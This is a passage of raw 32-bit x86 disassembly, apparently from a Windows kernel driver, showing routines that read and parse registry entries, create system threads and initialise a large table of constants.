   18ba7:	push   0x1d2e8
   18bac:	mov    edi,0x1c098
   18bb1:	push   edi
   18bb2:	call   DWORD PTR ds:0x1b160
   18bb8:	push   0x1abce
   18bbd:	push   edi
   18bbe:	call   esi
   18bc0:	push   0x1af9a
   18bc5:	push   edi
   18bc6:	call   esi
   18bc8:	push   0x1abce
   18bcd:	push   edi
   18bce:	call   esi
   18bd0:	push   0x1c790
   18bd5:	push   edi
   18bd6:	call   DWORD PTR ds:0x1b20c
   18bdc:	movzx  eax,WORD PTR ds:0x1ca02
   18be3:	push   eax
   18be4:	push   ebx
   18be5:	push   DWORD PTR ds:0x1ca04
   18beb:	call   0x1a1b0
   18bf0:	add    esp,0xc
   18bf3:	push   0x1af74
   18bf8:	mov    edi,0x1ca00
   18bfd:	push   edi
   18bfe:	call   esi
   18c00:	push   0x1c790
   18c05:	push   edi
   18c06:	call   DWORD PTR ds:0x1b20c
   18c0c:	push   0x1af34
   18c11:	push   edi
   18c12:	call   esi
   18c14:	push   0x1af66
   18c19:	push   edi
   18c1a:	call   esi
   18c1c:	movzx  eax,WORD PTR ds:0x1c0b2
   18c23:	push   eax
   18c24:	push   ebx
   18c25:	push   DWORD PTR ds:0x1c0b4
   18c2b:	call   0x1a1b0
   18c30:	add    esp,0xc
   18c33:	push   0x1af74
   18c38:	mov    edi,0x1c0b0
   18c3d:	push   edi
   18c3e:	call   esi
   18c40:	push   0x1c790
   18c45:	push   edi
   18c46:	call   DWORD PTR ds:0x1b20c
   18c4c:	push   0x1af34
   18c51:	push   edi
   18c52:	call   esi
   18c54:	push   0x1af58
   18c59:	push   edi
   18c5a:	call   esi
   18c5c:	push   DWORD PTR ds:0x1c09c
   18c62:	call   0x13c9a
   18c67:	push   DWORD PTR ds:0x1c09c
   18c6d:	call   0x13d1a
   18c72:	xor    esi,esi
   18c74:	call   0x13e56
   18c79:	test   eax,eax
   18c7b:	je     0x18c9b
   18c7d:	lea    eax,[ebp-0x640]
   18c83:	push   eax
   18c84:	push   ebx
   18c85:	push   ebx
   18c86:	push   ebx
   18c87:	push   0x1d0a0
   18c8c:	call   DWORD PTR ds:0x1b110
   18c92:	inc    esi
   18c93:	cmp    esi,0x3e8
   18c99:	jb     0x18c74
   18c9b:	push   ebx
   18c9c:	push   0x179d0
   18ca1:	push   ebx
   18ca2:	push   ebx
   18ca3:	lea    eax,[ebp-0x638]
   18ca9:	push   eax
   18caa:	mov    edi,0x1f03ff
   18caf:	push   edi
   18cb0:	lea    eax,[ebp-0x620]
   18cb6:	push   eax
   18cb7:	mov    DWORD PTR [ebp-0x638],0x18
   18cc1:	mov    DWORD PTR [ebp-0x634],ebx
   18cc7:	mov    DWORD PTR [ebp-0x62c],0x200
   18cd1:	mov    DWORD PTR [ebp-0x630],ebx
   18cd7:	mov    DWORD PTR [ebp-0x628],ebx
   18cdd:	mov    DWORD PTR [ebp-0x624],ebx
   18ce3:	call   DWORD PTR ds:0x1b244
   18ce9:	mov    esi,eax
   18ceb:	cmp    esi,ebx
   18ced:	jne    0x18d10
   18cef:	push   ebx
   18cf0:	push   0x1bfdc
   18cf5:	push   ebx
   18cf6:	push   ebx
   18cf7:	push   edi
   18cf8:	push   DWORD PTR [ebp-0x620]
   18cfe:	call   DWORD PTR ds:0x1b19c
   18d04:	push   DWORD PTR [ebp-0x620]
   18d0a:	call   DWORD PTR ds:0x1b180
   18d10:	push   ebx
   18d11:	mov    BYTE PTR ds:0x1bf8e,0x1
   18d18:	call   DWORD PTR ds:0x1b240
   18d1e:	mov    eax,esi
   18d20:	pop    edi
   18d21:	mov    ecx,DWORD PTR [ebp-0x4]
   18d24:	pop    esi
   18d25:	xor    ecx,ebp
   18d27:	pop    ebx
   18d28:	call   0x1a164
   18d2d:	leave  
   18d2e:	ret    
   18d2f:	int3   
   18d30:	int3   
   18d31:	int3   
   18d32:	int3   
   18d33:	int3   
   18d34:	mov    edi,edi
   18d36:	push   ebp
   18d37:	mov    ebp,esp
   18d39:	sub    esp,0x864
   18d3f:	mov    eax,ds:0x1bb6c
   18d44:	xor    eax,ebp
   18d46:	mov    DWORD PTR [ebp-0x4],eax
   18d49:	push   esi
   18d4a:	push   edi
   18d4b:	xor    edi,edi
   18d4d:	mov    DWORD PTR [ebp-0x828],edi
   18d53:	mov    DWORD PTR [ebp-0x838],edi
   18d59:	mov    DWORD PTR [ebp-0x82c],edi
   18d5f:	call   0x10a8e
   18d64:	mov    esi,DWORD PTR ds:0x1b264
   18d6a:	push   edi
   18d6b:	push   0x1dda0
   18d70:	call   esi
   18d72:	push   edi
   18d73:	push   0x1c340
   18d78:	call   esi
   18d7a:	push   edi
   18d7b:	push   0x1c9e0
   18d80:	call   esi
   18d82:	push   edi
   18d83:	push   0x1c100
   18d88:	call   esi
   18d8a:	push   edi
   18d8b:	push   0x1d080
   18d90:	call   esi
   18d92:	push   edi
   18d93:	push   0x1c9c0
   18d98:	call   esi
   18d9a:	push   0x1b044
   18d9f:	lea    eax,[ebp-0x864]
   18da5:	push   eax
   18da6:	call   DWORD PTR ds:0x1b164
   18dac:	lea    eax,[ebp-0x864]
   18db2:	mov    DWORD PTR [ebp-0x850],eax
   18db8:	lea    eax,[ebp-0x858]
   18dbe:	push   eax
   18dbf:	push   0x20019
   18dc4:	lea    eax,[ebp-0x82c]
   18dca:	push   eax
   18dcb:	mov    DWORD PTR [ebp-0x858],0x18
   18dd5:	mov    DWORD PTR [ebp-0x854],edi
   18ddb:	mov    DWORD PTR [ebp-0x84c],0x240
   18de5:	mov    DWORD PTR [ebp-0x848],edi
   18deb:	mov    DWORD PTR [ebp-0x844],edi
   18df1:	call   DWORD PTR ds:0x1b260
   18df7:	test   eax,eax
   18df9:	jne    0x19146
   18dff:	push   ebx
   18e00:	mov    ebx,0x818
   18e05:	push   ebx
   18e06:	push   0x1
   18e08:	call   DWORD PTR ds:0x1b124
   18e0e:	mov    esi,eax
   18e10:	cmp    esi,edi
   18e12:	mov    DWORD PTR [ebp-0x840],esi
   18e18:	je     0x19139
   18e1e:	push   ebx
   18e1f:	push   edi
   18e20:	push   esi
   18e21:	mov    DWORD PTR [ebp-0x834],edi
   18e27:	call   0x1a1b0
   18e2c:	add    esp,0xc
   18e2f:	lea    eax,[ebp-0x828]
   18e35:	push   eax
   18e36:	push   ebx
   18e37:	push   esi
   18e38:	push   0x1
   18e3a:	push   edi
   18e3b:	jmp    0x1911a
   18e40:	cmp    eax,edi
   18e42:	jne    0x190f8
   18e48:	cmp    DWORD PTR [esi+0x4],0x1
   18e4c:	jne    0x190f8
   18e52:	cmp    DWORD PTR [esi+0x10],edi
   18e55:	je     0x190f8
   18e5b:	cmp    DWORD PTR [esi+0xc],edi
   18e5e:	je     0x190f8
   18e64:	push   0x208
   18e69:	lea    eax,[ebp-0x824]
   18e6f:	push   edi
   18e70:	push   eax
   18e71:	call   0x1a1b0
   18e76:	mov    eax,DWORD PTR [esi+0x10]
   18e79:	shr    eax,1
   18e7b:	mov    ecx,0x103
   18e80:	add    esp,0xc
   18e83:	cmp    eax,ecx
   18e85:	jb     0x18e89
   18e87:	mov    eax,ecx
   18e89:	push   eax
   18e8a:	lea    eax,[esi+0x14]
   18e8d:	push   eax
   18e8e:	lea    eax,[ebp-0x824]
   18e94:	push   eax
   18e95:	call   DWORD PTR ds:0x1b194
   18e9b:	push   0x208
   18ea0:	lea    eax,[ebp-0x414]
   18ea6:	push   edi
   18ea7:	push   eax
   18ea8:	call   0x1a1b0
   18ead:	mov    eax,DWORD PTR [esi+0xc]
   18eb0:	shr    eax,1
   18eb2:	mov    ecx,0x103
   18eb7:	add    esp,0x18
   18eba:	cmp    eax,ecx
   18ebc:	jb     0x18ec0
   18ebe:	mov    eax,ecx
   18ec0:	push   eax
   18ec1:	mov    eax,DWORD PTR [esi+0x8]
   18ec4:	add    eax,esi
   18ec6:	push   eax
   18ec7:	lea    eax,[ebp-0x414]
   18ecd:	push   eax
   18ece:	call   DWORD PTR ds:0x1b194
   18ed4:	lea    eax,[ebp-0x824]
   18eda:	push   0x1b036
   18edf:	push   eax
   18ee0:	call   DWORD PTR ds:0x1b1c8
   18ee6:	add    esp,0x14
   18ee9:	test   eax,eax
   18eeb:	je     0x190f8
   18ef1:	mov    ebx,0x208
   18ef6:	push   ebx
   18ef7:	lea    eax,[ebp-0x61c]
   18efd:	push   edi
   18efe:	push   eax
   18eff:	mov    DWORD PTR [ebp-0x830],edi
   18f05:	mov    DWORD PTR [ebp-0x83c],edi
   18f0b:	call   0x1a1b0
   18f10:	add    esp,0xc
   18f13:	cmp    WORD PTR [ebp-0x414],0x2a
   18f1b:	lea    esi,[ebp-0x414]
   18f21:	jne    0x18f2b
   18f23:	lea    esi,[ebp-0x412]
   18f29:	jmp    0x18f83
   18f2b:	push   ebx
   18f2c:	lea    eax,[ebp-0x20c]
   18f32:	push   edi
   18f33:	push   eax
   18f34:	call   0x1a1b0
   18f39:	movzx  eax,WORD PTR [ebp-0x414]
   18f40:	add    esp,0xc
   18f43:	xor    ecx,ecx
   18f45:	cmp    ax,di
   18f48:	je     0x18f66
   18f4a:	cmp    ecx,0x103
   18f50:	jae    0x18f66
   18f52:	inc    esi
   18f53:	inc    esi
   18f54:	mov    WORD PTR [ebp+ecx*2-0x20c],ax
   18f5c:	movzx  eax,WORD PTR [esi]
   18f5f:	inc    ecx
   18f60:	cmp    ax,0x2a
   18f64:	jne    0x18f45
   18f66:	cmp    WORD PTR [esi],0x2a
   18f6a:	jne    0x18f6e
   18f6c:	inc    esi
   18f6d:	inc    esi
   18f6e:	push   0xa
   18f70:	push   edi
   18f71:	lea    eax,[ebp-0x20c]
   18f77:	push   eax
   18f78:	call   0x108fe
   18f7d:	mov    DWORD PTR [ebp-0x83c],eax
   18f83:	movzx  ebx,WORD PTR [esi]
   18f86:	cmp    bx,0x2a
   18f8a:	jne    0x18f93
   18f8c:	inc    esi
   18f8d:	inc    esi
   18f8e:	jmp    0x19027
   18f93:	push   0x208
   18f98:	lea    eax,[ebp-0x20c]
   18f9e:	push   edi
   18f9f:	push   eax
   18fa0:	call   0x1a1b0
   18fa5:	add    esp,0xc
   18fa8:	xor    eax,eax
   18faa:	cmp    bx,di
   18fad:	je     0x18fcc
   18faf:	mov    ecx,0x103
   18fb4:	cmp    eax,ecx
   18fb6:	jae    0x18fd1
   18fb8:	inc    esi
   18fb9:	inc    esi
   18fba:	mov    WORD PTR [ebp+eax*2-0x20c],bx
   18fc2:	movzx  ebx,WORD PTR [esi]
   18fc5:	inc    eax
   18fc6:	cmp    bx,0x2a
   18fca:	jne    0x18faa
   18fcc:	mov    ecx,0x103
   18fd1:	cmp    WORD PTR [esi],0x2a
   18fd5:	jne    0x18fd9
   18fd7:	inc    esi
   18fd8:	inc    esi
   18fd9:	lea    eax,[ebp-0x20c]
   18fdf:	lea    ebx,[eax+0x2]
   18fe2:	mov    dx,WORD PTR [eax]
   18fe5:	inc    eax
   18fe6:	inc    eax
   18fe7:	cmp    dx,di
   18fea:	jne    0x18fe2
   18fec:	sub    eax,ebx
   18fee:	sar    eax,1
   18ff0:	cmp    eax,ecx
   18ff2:	jae    0x1900d
   18ff4:	lea    eax,[ebp-0x20c]
   18ffa:	lea    edx,[eax+0x2]
   18ffd:	mov    cx,WORD PTR [eax]
   19000:	inc    eax
   19001:	inc    eax
   19002:	cmp    cx,di
   19005:	jne    0x18ffd
   19007:	sub    eax,edx
   19009:	sar    eax,1
   1900b:	jmp    0x1900f
   1900d:	mov    eax,ecx
   1900f:	push   eax
   19010:	lea    eax,[ebp-0x20c]
   19016:	push   eax
   19017:	lea    eax,[ebp-0x61c]
   1901d:	push   eax
   1901e:	call   DWORD PTR ds:0x1b194
   19024:	add    esp,0xc
   19027:	movzx  ebx,WORD PTR [esi]
   1902a:	cmp    bx,0x2a
   1902e:	je     0x190b5
   19034:	push   0x208
   19039:	lea    eax,[ebp-0x20c]
   1903f:	push   edi
   19040:	push   eax
   19041:	call   0x1a1b0
   19046:	add    esp,0xc
   19049:	xor    eax,eax
   1904b:	cmp    bx,di
   1904e:	je     0x1906b
   19050:	cmp    eax,0x103
   19055:	jae    0x1906b
   19057:	inc    esi
   19058:	inc    esi
   19059:	mov    WORD PTR [ebp+eax*2-0x20c],bx
   19061:	movzx  ebx,WORD PTR [esi]
   19064:	inc    eax
   19065:	cmp    bx,0x2a
   19069:	jne    0x1904b
   1906b:	mov    esi,DWORD PTR ds:0x1b1c8
   19071:	lea    eax,[ebp-0x20c]
   19077:	push   0x1b030
   1907c:	push   eax
   1907d:	call   esi
   1907f:	test   eax,eax
   19081:	pop    ecx
   19082:	pop    ecx
   19083:	jne    0x1909d
   19085:	lea    eax,[ebp-0x20c]
   1908b:	push   0x1b02a
   19090:	push   eax
   19091:	call   esi
   19093:	test   eax,eax
   19095:	pop    ecx
   19096:	pop    ecx
   19097:	jne    0x1909d
   19099:	push   0x10
   1909b:	jmp    0x1909e
   1909d:	push   edi
   1909e:	push   edi
   1909f:	lea    eax,[ebp-0x20c]
   190a5:	push   eax
   190a6:	call   0x108fe
   190ab:	cmp    eax,edi
   190ad:	mov    DWORD PTR [ebp-0x830],eax
   190b3:	jne    0x190ce
   190b5:	lea    eax,[ebp-0x61c]
   190bb:	lea    edx,[eax+0x2]
   190be:	mov    cx,WORD PTR [eax]
   190c1:	inc    eax
   190c2:	inc    eax
   190c3:	cmp    cx,di
   190c6:	jne    0x190be
   190c8:	sub    eax,edx
   190ca:	sar    eax,1
   190cc:	je     0x190ed
   190ce:	push   edi
   190cf:	lea    eax,[ebp-0x61c]
   190d5:	push   eax
   190d6:	push   DWORD PTR [ebp-0x830]
   190dc:	push   DWORD PTR [ebp-0x83c]
   190e2:	call   0x12050
   190e7:	inc    DWORD PTR ds:0x1bfa4
   190ed:	mov    esi,DWORD PTR [ebp-0x840]
   190f3:	mov    ebx,0x818
   190f8:	inc    DWORD PTR [ebp-0x834]
   190fe:	push   ebx
   190ff:	push   edi
   19100:	push   esi
   19101:	call   0x1a1b0
   19106:	add    esp,0xc
   19109:	lea    eax,[ebp-0x828]
   1910f:	push   eax
   19110:	push   ebx
   19111:	push   esi
   19112:	push   0x1
   19114:	push   DWORD PTR [ebp-0x834]
   1911a:	push   DWORD PTR [ebp-0x82c]
   19120:	call   DWORD PTR ds:0x1b25c
   19126:	cmp    eax,0x8000001a
   1912b:	jne    0x18e40
   19131:	push   edi
   19132:	push   esi
   19133:	call   DWORD PTR ds:0x1b278
   19139:	push   DWORD PTR [ebp-0x82c]
   1913f:	call   DWORD PTR ds:0x1b180
   19145:	pop    ebx
   19146:	mov    DWORD PTR [ebp-0x828],edi
   1914c:	push   0x13ec2
   19151:	call   DWORD PTR ds:0x1b258
   19157:	test   eax,eax
   19159:	je     0x1916a
   1915b:	inc    DWORD PTR [ebp-0x828]
   19161:	cmp    DWORD PTR [ebp-0x828],0x3
   19168:	jb     0x1914c
   1916a:	mov    DWORD PTR [ebp-0x828],edi
   19170:	push   edi
   19171:	push   0x14706
   19176:	call   DWORD PTR ds:0x1b254
   1917c:	test   eax,eax
   1917e:	je     0x1918f
   19180:	inc    DWORD PTR [ebp-0x828]
   19186:	cmp    DWORD PTR [ebp-0x828],0x3
   1918d:	jb     0x19170
   1918f:	push   edi
   19190:	push   0x180e2
   19195:	push   edi
   19196:	push   edi
   19197:	lea    eax,[ebp-0x858]
   1919d:	push   eax
   1919e:	push   0x1f03ff
   191a3:	lea    eax,[ebp-0x838]
   191a9:	push   eax
   191aa:	mov    DWORD PTR [ebp-0x858],0x18
   191b4:	mov    DWORD PTR [ebp-0x854],edi
   191ba:	mov    DWORD PTR [ebp-0x84c],0x200
   191c4:	mov    DWORD PTR [ebp-0x850],edi
   191ca:	mov    DWORD PTR [ebp-0x848],edi
   191d0:	mov    DWORD PTR [ebp-0x844],edi
   191d6:	call   DWORD PTR ds:0x1b244
   191dc:	test   eax,eax
   191de:	pop    edi
   191df:	pop    esi
   191e0:	jne    0x191ee
   191e2:	push   DWORD PTR [ebp-0x838]
   191e8:	call   DWORD PTR ds:0x1b180
   191ee:	mov    ecx,DWORD PTR [ebp-0x4]
   191f1:	xor    ecx,ebp
   191f3:	xor    eax,eax
   191f5:	call   0x1a164
   191fa:	leave  
   191fb:	ret    
   191fc:	int3   
   191fd:	int3   
   191fe:	int3   
   191ff:	int3   
   19200:	int3   
   19201:	int3   
   19202:	call   0x18d34
   19207:	xor    eax,eax
   19209:	ret    0x4
   1920c:	int3   
   1920d:	int3   
   1920e:	int3   
   1920f:	int3   
   19210:	int3   
   19211:	int3   
   19212:	mov    edi,edi
   19214:	push   ebp
   19215:	mov    ebp,esp
   19217:	sub    esp,0x80c
   1921d:	mov    eax,DWORD PTR [ebp+0x8]
   19220:	xor    edx,edx
   19222:	push   ebx
   19223:	push   esi
   19224:	xor    ecx,ecx
   19226:	inc    ecx
   19227:	push   edi
   19228:	mov    edi,0x1000
   1922d:	mov    DWORD PTR [ebp-0xc],eax
   19230:	mov    eax,0x800
   19235:	mov    DWORD PTR [ebp-0x8],edx
   19238:	mov    DWORD PTR [ebp-0x40c],eax
   1923e:	mov    DWORD PTR [ebp-0x408],eax
   19244:	mov    DWORD PTR [ebp-0x404],eax
   1924a:	mov    DWORD PTR [ebp-0x400],eax
   19250:	mov    DWORD PTR [ebp-0x3fc],edi
   19256:	mov    DWORD PTR [ebp-0x3f8],edi
   1925c:	mov    DWORD PTR [ebp-0x3f4],edx
   19262:	mov    DWORD PTR [ebp-0x3f0],edx
   19268:	mov    DWORD PTR [ebp-0x3ec],eax
   1926e:	mov    DWORD PTR [ebp-0x3e8],eax
   19274:	mov    DWORD PTR [ebp-0x3e4],eax
   1927a:	mov    DWORD PTR [ebp-0x3e0],eax
   19280:	mov    DWORD PTR [ebp-0x3dc],edi
   19286:	mov    DWORD PTR [ebp-0x3d8],edi
   1928c:	mov    DWORD PTR [ebp-0x3d4],edx
   19292:	mov    DWORD PTR [ebp-0x3d0],0x4000
   1929c:	mov    DWORD PTR [ebp-0x3cc],eax
   192a2:	mov    DWORD PTR [ebp-0x3c8],eax
   192a8:	mov    DWORD PTR [ebp-0x3c4],eax
   192ae:	mov    DWORD PTR [ebp-0x3c0],eax
   192b4:	mov    DWORD PTR [ebp-0x3bc],edi
   192ba:	mov    DWORD PTR [ebp-0x3b8],edi
   192c0:	mov    DWORD PTR [ebp-0x3b4],edx
   192c6:	mov    DWORD PTR [ebp-0x3b0],edx
   192cc:	mov    DWORD PTR [ebp-0x3ac],eax
   192d2:	mov    DWORD PTR [ebp-0x3a8],eax
   192d8:	mov    DWORD PTR [ebp-0x3a4],eax
   192de:	mov    DWORD PTR [ebp-0x3a0],eax
   192e4:	mov    DWORD PTR [ebp-0x39c],edi
   192ea:	mov    DWORD PTR [ebp-0x398],edi
   192f0:	mov    DWORD PTR [ebp-0x394],edx
   192f6:	mov    DWORD PTR [ebp-0x390],edx
   192fc:	mov    DWORD PTR [ebp-0x38c],eax
   19302:	mov    DWORD PTR [ebp-0x388],eax
   19308:	mov    DWORD PTR [ebp-0x384],eax
   1930e:	mov    DWORD PTR [ebp-0x380],eax
   19314:	mov    DWORD PTR [ebp-0x37c],edi
   1931a:	mov    DWORD PTR [ebp-0x378],edi
   19320:	mov    DWORD PTR [ebp-0x374],ecx
   19326:	mov    DWORD PTR [ebp-0x370],edx
   1932c:	mov    DWORD PTR [ebp-0x36c],eax
   19332:	mov    DWORD PTR [ebp-0x368],eax
   19338:	mov    DWORD PTR [ebp-0x364],eax
   1933e:	mov    DWORD PTR [ebp-0x360],eax
   19344:	mov    DWORD PTR [ebp-0x35c],edi
   1934a:	mov    DWORD PTR [ebp-0x358],edi
   19350:	mov    DWORD PTR [ebp-0x354],ecx
   19356:	mov    DWORD PTR [ebp-0x350],edx
   1935c:	mov    DWORD PTR [ebp-0x34c],eax
   19362:	mov    DWORD PTR [ebp-0x348],eax
   19368:	mov    DWORD PTR [ebp-0x344],eax
   1936e:	mov    DWORD PTR [ebp-0x340],eax
   19374:	mov    DWORD PTR [ebp-0x33c],edi
   1937a:	mov    DWORD PTR [ebp-0x338],edi
   19380:	mov    DWORD PTR [ebp-0x334],ecx
   19386:	mov    DWORD PTR [ebp-0x330],edx
   1938c:	mov    DWORD PTR [ebp-0x32c],eax
   19392:	mov    DWORD PTR [ebp-0x328],eax
   19398:	mov    DWORD PTR [ebp-0x324],eax
   1939e:	mov    DWORD PTR [ebp-0x320],eax
   193a4:	mov    DWORD PTR [ebp-0x31c],edi
   193aa:	mov    DWORD PTR [ebp-0x318],edi
   193b0:	mov    DWORD PTR [ebp-0x314],ecx
   193b6:	mov    DWORD PTR [ebp-0x310],edx
   193bc:	mov    DWORD PTR [ebp-0x30c],edx
   193c2:	mov    DWORD PTR [ebp-0x308],edx
   193c8:	mov    DWORD PTR [ebp-0x304],edx
   193ce:	mov    DWORD PTR [ebp-0x300],edx
   193d4:	mov    DWORD PTR [ebp-0x2fc],edx
   193da:	mov    DWORD PTR [ebp-0x2f8],edx
   193e0:	push   0x8
   193e2:	pop    esi
   193e3:	lea    ebx,[eax+0x10]
   193e6:	push   0x10
   193e8:	mov    DWORD PTR [ebp-0x27c],ecx
   193ee:	mov    DWORD PTR [ebp-0x278],ecx
   193f4:	pop    ecx
   193f5:	mov    DWORD PTR [ebp-0x2f4],edx
   193fb:	mov    DWORD PTR [ebp-0x2f0],edx
   19401:	mov    DWORD PTR [ebp-0x2ec],edx
   19407:	mov    DWORD PTR [ebp-0x2e8],edx
   1940d:	mov    DWORD PTR [ebp-0x2e4],edx
   19413:	mov    DWORD PTR [ebp-0x2e0],edx
   19419:	mov    DWORD PTR [ebp-0x2dc],edx
   1941f:	mov    DWORD PTR [ebp-0x2d8],edx
   19425:	mov    DWORD PTR [ebp-0x2d4],edx
   1942b:	mov    DWORD PTR [ebp-0x2d0],edx
   19431:	mov    DWORD PTR [ebp-0x2cc],edx
   19437:	mov    DWORD PTR [ebp-0x2c8],edx
   1943d:	mov    DWORD PTR [ebp-0x2c4],edx
   19443:	mov    DWORD PTR [ebp-0x2c0],edx
   19449:	mov    DWORD PTR [ebp-0x2bc],edx
   1944f:	mov    DWORD PTR [ebp-0x2b8],edx
   19455:	mov    DWORD PTR [ebp-0x2b4],edx
   1945b:	mov    DWORD PTR [ebp-0x2b0],edx
   19461:	mov    DWORD PTR [ebp-0x2ac],edx
   19467:	mov    DWORD PTR [ebp-0x2a8],edx
   1946d:	mov    DWORD PTR [ebp-0x2a4],edx
   19473:	mov    DWORD PTR [ebp-0x2a0],edx
   19479:	mov    DWORD PTR [ebp-0x29c],edx
   1947f:	mov    DWORD PTR [ebp-0x298],edx
   19485:	mov    DWORD PTR [ebp-0x294],edx
   1948b:	mov    DWORD PTR [ebp-0x290],edx
   19491:	mov    DWORD PTR [ebp-0x28c],edx
   19497:	mov    DWORD PTR [ebp-0x288],edx
   1949d:	mov    DWORD PTR [ebp-0x284],eax
   194a3:	mov    DWORD PTR [ebp-0x280],eax
   194a9:	mov    DWORD PTR [ebp-0x274],0x3
   194b3:	mov    DWORD PTR [ebp-0x270],0x5
   194bd:	mov    DWORD PTR [ebp-0x26c],esi
   194c3:	mov    DWORD PTR [ebp-0x268],0x808
   194cd:	mov    DWORD PTR [ebp-0x264],ecx
   194d3:	mov    DWORD PTR [ebp-0x260],ebx
   194d9:	mov    DWORD PTR [ebp-0x25c],edx
   194df:	mov    DWORD PTR [ebp-0x258],edx
   194e5:	mov    DWORD PTR [ebp-0x254],edx
   194eb:	mov    DWORD PTR [ebp-0x250],edx
   194f1:	mov    DWORD PTR [ebp-0x24c],ecx
   194f7:	mov    DWORD PTR [ebp-0x248],ecx
   194fd:	mov    DWORD PTR [ebp-0x244],ecx
   19503:	mov    DWORD PTR [ebp-0x240],ecx
   19509:	mov    DWORD PTR [ebp-0x23c],ecx
   1950f:	mov    DWORD PTR [ebp-0x238],ecx
   19515:	mov    DWORD PTR [ebp-0x234],ecx
   1951b:	mov    DWORD PTR [ebp-0x230],ecx
   19521:	mov    DWORD PTR [ebp-0x22c],ecx
   19527:	mov    DWORD PTR [ebp-0x228],ecx
   1952d:	mov    DWORD PTR [ebp-0x224],ecx
   19533:	mov    DWORD PTR [ebp-0x220],ecx
   19539:	mov    DWORD PTR [ebp-0x21c],ecx
   1953f:	mov    DWORD PTR [ebp-0x218],ecx
   19545:	mov    DWORD PTR [ebp-0x214],ecx
   1954b:	mov    DWORD PTR [ebp-0x210],ecx
   19551:	mov    DWORD PTR [ebp-0x20c],ebx
   19557:	mov    DWORD PTR [ebp-0x208],0x808
   19561:	mov    DWORD PTR [ebp-0x204],ebx
   19567:	mov    DWORD PTR [ebp-0x200],ebx
   1956d:	mov    DWORD PTR [ebp-0x1fc],eax
   19573:	mov    DWORD PTR [ebp-0x1f8],eax
   19579:	mov    DWORD PTR [ebp-0x1f4],eax
   1957f:	mov    DWORD PTR [ebp-0x1f0],eax
   19585:	mov    DWORD PTR [ebp-0x1ec],eax
   1958b:	mov    DWORD PTR [ebp-0x1e8],eax
   19591:	mov    DWORD PTR [ebp-0x1e4],eax
   19597:	mov    DWORD PTR [ebp-0x1e0],eax
   1959d:	mov    DWORD PTR [ebp-0x1dc],eax
   195a3:	mov    DWORD PTR [ebp-0x1d8],eax
   195a9:	mov    DWORD PTR [ebp-0x1d4],eax
   195af:	mov    DWORD PTR [ebp-0x1d0],eax
   195b5:	mov    DWORD PTR [ebp-0x1cc],edx
   195bb:	mov    DWORD PTR [ebp-0x1c8],edx
   195c1:	mov    DWORD PTR [ebp-0x1c4],edx
   195c7:	mov    DWORD PTR [ebp-0x1c0],edx
   195cd:	mov    DWORD PTR [ebp-0x1bc],edx
   195d3:	mov    DWORD PTR [ebp-0x1b8],edx
   195d9:	mov    DWORD PTR [ebp-0x1b4],edx
   195df:	mov    DWORD PTR [ebp-0x1b0],edx
   195e5:	mov    DWORD PTR [ebp-0x1ac],edx
   195eb:	mov    DWORD PTR [ebp-0x1a8],edx
   195f1:	mov    DWORD PTR [ebp-0x1a4],0x208
   195fb:	mov    DWORD PTR [ebp-0x1a0],edx
   19601:	mov    DWORD PTR [ebp-0x19c],edx
   19607:	mov    DWORD PTR [ebp-0x198],edx
   1960d:	mov    DWORD PTR [ebp-0x194],edx
   19613:	mov    DWORD PTR [ebp-0x190],edx
   19619:	mov    DWORD PTR [ebp-0x18c],0x80
   19623:	mov    DWORD PTR [ebp-0x188],0x80
   1962d:	mov    DWORD PTR [ebp-0x184],0x80
   19637:	mov    DWORD PTR [ebp-0x180],0x80
   19641:	mov    DWORD PTR [ebp-0x17c],edx
   19647:	mov    DWORD PTR [ebp-0x178],edx
   1964d:	mov    DWORD PTR [ebp-0x174],edx
   19653:	mov    DWORD PTR [ebp-0x170],edx
   19659:	mov    DWORD PTR [ebp-0x16c],ecx
   1965f:	mov    DWORD PTR [ebp-0x168],esi
   19665:	mov    DWORD PTR [ebp-0x164],edx
   1966b:	mov    DWORD PTR [ebp-0x160],edx
   19671:	mov    DWORD PTR [ebp-0x15c],edx
   19677:	mov    DWORD PTR [ebp-0x158],edx
   1967d:	mov    DWORD PTR [ebp-0x154],edx
   19683:	mov    DWORD PTR [ebp-0x150],edx
   19689:	mov    DWORD PTR [ebp-0x14c],ecx
   1968f:	mov    DWORD PTR [ebp-0x148],ecx
   19695:	mov    DWORD PTR [ebp-0x144],ecx
   1969b:	mov    DWORD PTR [ebp-0x140],ecx
   196a1:	mov    DWORD PTR [ebp-0x13c],ecx
   196a7:	mov    DWORD PTR [ebp-0x138],ecx
   196ad:	mov    DWORD PTR [ebp-0x134],ecx
   196b3:	mov    DWORD PTR [ebp-0x130],ecx
   196b9:	mov    DWORD PTR [ebp-0x12c],esi
   196bf:	mov    DWORD PTR [ebp-0x128],esi
   196c5:	mov    DWORD PTR [ebp-0x124],esi
   196cb:	mov    DWORD PTR [ebp-0x120],esi
   196d1:	mov    DWORD PTR [ebp-0x11c],esi
   196d7:	mov    DWORD PTR [ebp-0x118],esi
   196dd:	mov    DWORD PTR [ebp-0x114],esi
   196e3:	mov    DWORD PTR [ebp-0x110],esi
   196e9:	mov    DWORD PTR [ebp-0x10c],ebx
   196ef:	mov    DWORD PTR [ebp-0x108],ebx
   196f5:	mov    DWORD PTR [ebp-0x104],0x20
   196ff:	mov    DWORD PTR [ebp-0x100],edx
   19705:	mov    DWORD PTR [ebp-0xfc],eax
   1970b:	mov    DWORD PTR [ebp-0xf8],eax
   19711:	mov    DWORD PTR [ebp-0xf4],0x808
   1971b:	mov    DWORD PTR [ebp-0xf0],0x808
   19725:	mov    DWORD PTR [ebp-0xec],0x30
   1972f:	mov    DWORD PTR [ebp-0xe8],edx
   19735:	mov    DWORD PTR [ebp-0xe4],0x20
   1973f:	mov    DWORD PTR [ebp-0xe0],edx
   19745:	mov    DWORD PTR [ebp-0xdc],edx
   1974b:	mov    DWORD PTR [ebp-0xd8],0x50
   19755:	mov    DWORD PTR [ebp-0xd4],edx
   1975b:	mov    DWORD PTR [ebp-0xd0],edx
   19761:	mov    DWORD PTR [ebp-0xcc],eax
   19767:	mov    DWORD PTR [ebp-0xc8],eax
   1976d:	mov    DWORD PTR [ebp-0xc4],eax
   19773:	mov    DWORD PTR [ebp-0xc0],eax
   19779:	mov    DWORD PTR [ebp-0xbc],edx
   1977f:	mov    DWORD PTR [ebp-0xb8],edx
   19785:	mov    DWORD PTR [ebp-0xb4],edx
   1978b:	mov    DWORD PTR [ebp-0xb0],edx
   19791:	mov    DWORD PTR [ebp-0xac],eax
   19797:	mov    DWORD PTR [ebp-0xa8],eax
   1979d:	mov    DWORD PTR [ebp-0xa4],eax
   197a3:	mov    DWORD PTR [ebp-0xa0],eax
